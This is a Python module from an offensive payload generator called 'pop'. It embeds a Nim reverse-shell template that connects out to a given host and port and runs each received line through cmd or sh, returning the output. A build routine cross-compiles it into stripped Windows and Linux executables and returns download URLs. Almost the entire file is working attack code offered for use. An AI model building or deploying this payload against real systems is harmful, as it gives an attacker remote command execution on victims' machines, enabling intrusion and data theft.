#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import getopt
import os

TARGETS = {
    'windows': ['amd64'],
    'linux': ['amd64'],
}


USAGE = 'host port'
NARGS = [2, 2]
LANG = 'nim'
EXEC = ''


pl = '''
import net, osproc

var
    sock = newSocket()

const po: set[ProcessOption] = {poStdErrToStdOut, poUsePath}
when defined(windows):
  const sh  = "cmd"
  const arg = "/c"
else:
  const sh  = "sh"
  const arg = "-c"

try:
    sock.connect("ARG1", Port(ARG2))

    while true:
        let cmd = sock.recvLine()
        if cmd == "exit":
            break
        let result = execProcess(sh, args=[arg,cmd], options=po)
        sock.send(result)
except:
    raise
finally:
    sock.close
'''.strip()


def g(s, args, dst, url):
    with open('{}/src.nim'.format(dst), 'w') as fp:
        fp.write(s)

    targs = []
    with open('{}/build.sh'.format(dst), 'w') as fp:
        fp.write('cd $(dirname -- "${0}")\n')
        for tos in TARGETS:
            for arch in TARGETS[tos]:
                fn = '{}-{}'.format(tos, arch)
                o, c, r = '--os:{}'.format(tos), arch, 'release'
                if 'windows' == tos:
                    r = 'mingw'
                    o = ''
                fp.write('nim c -d:{} --cpu:{} {} -o:{} src.nim 2>/dev/null >/dev/null'.format(r, c, o, fn))
                fp.write('\n')
                fp.write('strip -s {}*\n'.format(fn))
                targs += [fn + '{}'.format('.exe' if 'windows' == tos else '')]

    os.system('/bin/sh "{}/build.sh"'.format(dst))

    return '\n'.join([url + f for f in ['src.nim', 'build.sh'] + targs])
